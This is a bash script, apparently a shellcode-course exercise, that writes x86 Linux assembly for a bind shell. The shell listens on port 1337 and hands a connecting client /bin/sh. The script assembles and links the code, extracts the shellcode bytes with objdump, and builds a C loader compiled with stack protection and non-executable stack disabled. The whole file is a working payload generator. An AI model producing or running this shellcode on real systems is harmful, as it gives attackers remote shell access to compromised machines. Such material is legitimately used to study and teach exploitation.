#!/usr/bin/env -S bash -x
# Author: @bugsam
# Date: 07/13/2020 
FILE=$0

PORT="0x3905" #1337 network byte order

echo "[+] Creating ASM source"
cat << EOF > $FILE.asm
global _start

_start:
        xor edi, edi
        xor edx, edx
        xor ebx, ebx
        xor eax, eax
        push edx
        push 0x01
        push 0x02
        mov ecx, esp
        mov bl, 0x01 
        mov al, 0x66
        int 0x80

        xor edx, edx
        push edx
        mov dx, ${PORT}
        shl edx, 0x10           
        mov dl, 0x02
        push edx                
        mov ecx, esp

        push 0x10
        push ecx
        push eax

        mov ecx, esp
        mov bl, 0x02
        mov al, 0x66
        int 0x80

        pop edx
        push edi
        push edx

        mov ecx, esp
        mov bl, 0x04
        mov al, 0x66
        int 0x80

        push edi
        push edi
        mov ecx, esp

        push edi
        push edi
        push edx

        mov ecx, esp
        mov bl, 0x05
        mov al, 0x66
        int 0x80

        xor ecx, ecx
        mov cl, 0x2
        mov ebx, eax           
loop:
        push ecx
        xor eax, eax
        mov al, 0x3f            
        int 0x80                
        pop ecx
        dec ecx
        jnl loop 

        jmp short get_bash 

execve:
        pop esi                 
        xor ebx, ebx
        lea ecx, [esi + 13]             
        mov dword[esi], ecx             
        mov dword[esi + 4], ebx         
        mov byte[esi + 15], bl          

        lea edx, [esi + 4]              
        lea ecx, [esi]                  
        lea ebx, [esi + 8]              

        xor eax, eax
        mov al, 0xb                     
        int 0x80

get_bash:
        call execve
        shell: db "ZZZZNNNN/bin/shN"
EOF

echo "[+] Compiling"
nasm -f elf32 ${FILE}.asm
[ ${?} -ne 0 ] && exit
echo "[+] Linking"
ld -o ${FILE}_elf ${FILE}.o
[ ${?} -ne 0 ] && exit

echo "[+] Creating shellcode"
# others people code
SHELLCODE=$(objdump -d ./${FILE}_elf | grep '[0-9a-f]:' | grep -v ${FILE}_elf | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g'| paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g')
echo $SHELLCODE

echo "[+] Creating C source"
# others people code
cat << EOF > $FILE.c
#include <stdio.h>
#include <string.h>

unsigned char code[] = ${SHELLCODE};
int main (){
        printf("Shellcode length: %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();
}
EOF
echo "[+] Compiling C code"
gcc -fno-stack-protector -zexecstack -o ${FILE}_ELF ${FILE}.c
